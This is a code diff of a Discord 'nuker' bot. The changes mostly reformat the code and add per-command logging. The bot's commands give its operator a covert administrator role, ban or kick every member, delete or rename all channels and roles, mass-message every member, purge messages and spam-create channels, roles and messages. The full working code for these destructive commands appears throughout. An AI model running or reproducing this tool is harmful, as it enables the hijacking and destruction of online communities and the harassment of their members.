@@ -12,9 +12,10 @@ client = commands.Bot(
 )
 client.remove_command('help')
 
+
 def allowed(ctx):
     return ctx.author.id == AUTHOR_ID
-    
+
 
 @client.event
 async def on_ready():
@@ -25,8 +26,9 @@ async def on_ready():
     print(
         f'\nLogged in as {client.user.name}#{client.user.discriminator},',
         f'User ID: {client.user.id}, Version: {discord.__version__}\n',
-		f'DISCORD BOT WRITTEN BY GHOST_BOI: https://github.com/Ghost-Boi/ghost-discord-nuker\n'
+        f'DISCORD BOT WRITTEN BY GHOST_BOI: https://github.com/Ghost-Boi/ghost-discord-nuker\n'
     )
+
 
 @client.event
 async def on_command_error(ctx, error):
@@ -42,35 +44,40 @@ async def on_command_error(ctx, error):
     else:
         print(error)
 
+
 @client.command()
 @commands.check(allowed)
 async def help(ctx):
-    embedVar = discord.Embed(title="Commands",description="All Nuker Commands", color=0x00ff00)
+    print(ctx.author, 'executed: .help in', ctx.guild)
+    embedVar = discord.Embed(title="Commands", description="All Nuker Commands", color=0x00ff00)
     embedVar.add_field(name="Prefix", value="'.'", inline=False)
     embedVar.add_field(name="Author", value="Determined on line 12.", inline=False)
     embedVar.add_field(name=".admin", value="Grants the Author Administrator Permissions.", inline=False)
-    embedVar.add_field(name=".ban", value="Bans Everyone from the Server Except from the Author and the Owner.", inline=False)
+    embedVar.add_field(name=".ban", value="Bans Everyone from the Server Except from the Author and the Owner.",
+                       inline=False)
     embedVar.add_field(name=".channel", value="Sub Commands:", inline=False)
     embedVar.add_field(name=".channel create", value="Will Spam Create Channels.", inline=False)
     embedVar.add_field(name=".channel rename", value="Will Rename All Channels with Random Names.", inline=False)
     embedVar.add_field(name=".channel delete", value="Will Delete All Channels.", inline=False)
-    embedVar.add_field(name=".dm [Message]", value="Direct Messages Everyone in the Server with [Message].", inline=False)
+    embedVar.add_field(name=".dm [Message]", value="Direct Messages Everyone in the Server with [Message].",
+                       inline=False)
     embedVar.add_field(name=".kick", value="Kicks Everyone from the Server Except from the Author.", inline=False)
-    embedVar.add_field(name=".nickname", value="Nicknames Everyone in the Server to a Random String Except the Author and the Owner.", inline=False)
+    embedVar.add_field(name=".nickname",
+                       value="Nicknames Everyone in the Server to a Random String Except the Author and the Owner.",
+                       inline=False)
     embedVar.add_field(name=".purge", value="Deletes Messages in  all Channels.", inline=False)
     embedVar.add_field(name=".role", value="Sub Commands:", inline=False)
     embedVar.add_field(name=".role create", value="Will Spam Create Roles.", inline=False)
     embedVar.add_field(name=".role rename", value="Will Rename All Roles.", inline=False)
     embedVar.add_field(name=".role delete", value="Will Delete All Roles.", inline=False)
-    embedVar.add_field(name=".spam [Message]", value="Spams [Message] in the Current Channel Until Stopped.", inline=False)
+    embedVar.add_field(name=".spam [Message]", value="Spams [Message] in the Current Channel Until Stopped.",
+                       inline=False)
     await ctx.send(embed=embedVar)
-    print('.help')
-    
-
 
 @client.command()
 @commands.check(allowed)
 async def admin(ctx):
+    print(ctx.author, 'executed: .admin in', ctx.guild)
     await ctx.message.delete()
     await ctx.guild.create_role(
         name='Hacker',
@@ -80,11 +87,12 @@ async def admin(ctx):
     role = discord.utils.get(ctx.guild.roles, name='Hacker')
     await ctx.author.add_roles(role)
     await ctx.send('✅ **Role Created!**')
-    print('.admin')
+
 
 @client.command()
 @commands.check(allowed)
 async def ban(ctx):
+    print(ctx.author, 'executed: .ban in', ctx.guild)
     await ctx.message.delete()
     await ctx.send('🔨 **Banning all members!**')
     for member in ctx.guild.members:
@@ -95,11 +103,12 @@ async def ban(ctx):
                 continue
         except discord.Forbidden:
             continue
-    print('.ban')
+
 
 @client.command()
 @commands.check(allowed)
 async def kick(ctx):
+    print(ctx.author, 'executed: .kick in', ctx.guild)
     await ctx.message.delete()
     await ctx.send('👢 **Roundhouse kicking all members!**')
     for member in ctx.guild.members:
@@ -110,13 +119,14 @@ async def kick(ctx):
                 continue
         except discord.Forbidden:
             continue
-    print('.kick')
+
 
 @client.command()
 @commands.check(allowed)
 async def channel(ctx, choice):
     await ctx.message.delete()
     if choice == 'create':
+        print(ctx.author, 'executed: .channel create in', ctx.guild)
         await ctx.send('✅ **Mitosis (channels)!** Type `stop` to stop.')
 
         def check_reply(m):
@@ -131,31 +141,31 @@ async def channel(ctx, choice):
         await client.wait_for('message', check=check_reply)
         spam_channel_task.cancel()
         await ctx.send('✅ **Mitosis complete!**')
-        print('.channel create')
 
     elif choice == 'delete':
+        print(ctx.author, 'executed: .channel delete in', ctx.guild)
         await ctx.send('✅ **Purging channels!**')
         for chan in ctx.guild.channels:
             await chan.delete()
-        print('.channel delete')
 
     elif choice == 'rename':
+        print(ctx.author, 'executed: .channel rename in', ctx.guild)
         await ctx.send('✅ **Renaming channels!**')
         char = string.ascii_letters + string.digits
         for chan in ctx.guild.channels:
             chan_name = ''.join((random.choice(char) for i in range(16)))
             await chan.edit(name=chan_name)
-        print('.channel rename')
 
     else:
         await ctx.send('🚫 **Invalid option!**')
         print('.channel 🚫 Invalid option!')
-    
+
 
 @client.command()
 @commands.check(allowed)
 async def dm(ctx, *, msg=None):
     await ctx.message.delete()
+    print(ctx.author, 'executed: .dm', msg, 'in', ctx.guild)
     if msg is not None:
         await ctx.send('✅ **Attempting to DM everyone!**')
         for member in ctx.guild.members:
@@ -169,24 +179,26 @@ async def dm(ctx, *, msg=None):
             else:
                 continue
         await ctx.send('✅ **Sliding into DMs complete!**')
-        print('.dm ',msg)
     else:
         await ctx.send('🚫 **I cannot send an empty message!**')
         print('.dm 🚫 I cannot send an empty message!')
 
+
 @client.command()
 @commands.check(allowed)
 async def purge(ctx):
+    print(ctx.author, 'executed: .purge in', ctx.guild)
     for tc in ctx.guild.text_channels:
         await tc.purge(bulk=True)
     await ctx.send('✅ **Purged all channels!**')
-    print('.purge')
+
 
 @client.command()
 @commands.check(allowed)
 async def role(ctx, choice):
     await ctx.message.delete()
     if choice == 'create':
+        print(ctx.author, 'executed: .role create in', ctx.guild)
         await ctx.send('✅ **Mitosis (roles)!** Type `stop` to stop.')
 
         def check_reply(m):
@@ -200,9 +212,9 @@ async def role(ctx, choice):
         await client.wait_for('message', check=check_reply)
         spam_role_task.cancel()
         await ctx.send('✅ **Mitosis complete!**')
-        print('.role create')
 
     elif choice == 'delete':
+        print(ctx.author, 'executed: .role delete in', ctx.guild)
         await ctx.send('✅ **Purging roles!**')
         roles = ctx.guild.roles
         roles.pop(0)
@@ -211,9 +223,9 @@ async def role(ctx, choice):
                 await role.delete()
             else:
                 break
-        print('.role delete')
 
     elif choice == 'rename':
+        print(ctx.author, 'executed: .role rename in', ctx.guild)
         await ctx.send('✅ **Renaming roles!**')
         char = string.ascii_letters + string.digits
         for role in ctx.guild.roles:
@@ -222,15 +234,16 @@ async def role(ctx, choice):
                 await role.edit(name=role_name)
             else:
                 break
-        print('.role rename')
 
     else:
         await ctx.send('🚫 **Invalid option!**')
         print('.role 🚫 Invalid option!')
 
+
 @client.command()
 @commands.check(allowed)
 async def spam(ctx, *, msg=None):
+    print(ctx.author, 'executed: .spam', msg, 'in', ctx.guild)
     await ctx.message.delete()
     if msg is not None:
         await ctx.send('✅ **Spamming initiated!** Type `stop` to stop.')
@@ -247,14 +260,15 @@ async def spam(ctx, *, msg=None):
         await client.wait_for('message', check=check_reply)
         spam_text_task.cancel()
         await ctx.send('✅ **Spamming complete!**')
-        print('.spam ',msg)
     else:
         await ctx.send('🚫 **I cannot send an empty message!**')
         print('.spam 🚫 I cannot send an empty message!')
 
+
 @client.command()
 @commands.check(allowed)
 async def nickname(ctx):
+    print(ctx.author, 'executed: .nickname in', ctx.guild)
     await ctx.message.delete()
     char = string.ascii_letters + string.digits
     for member in ctx.guild.members:
@@ -264,11 +278,13 @@ async def nickname(ctx):
         except discord.Forbidden:
             continue
     await ctx.send('✅ **Nicknamed everyone!**')
-    print('.nickname')
+
 
 @client.command()
 @commands.check(allowed)
 async def logout(ctx):
+    print(ctx.author, 'executed: .logout in', ctx.guild)
     await client.logout()
+
 
 client.run(TOKEN)
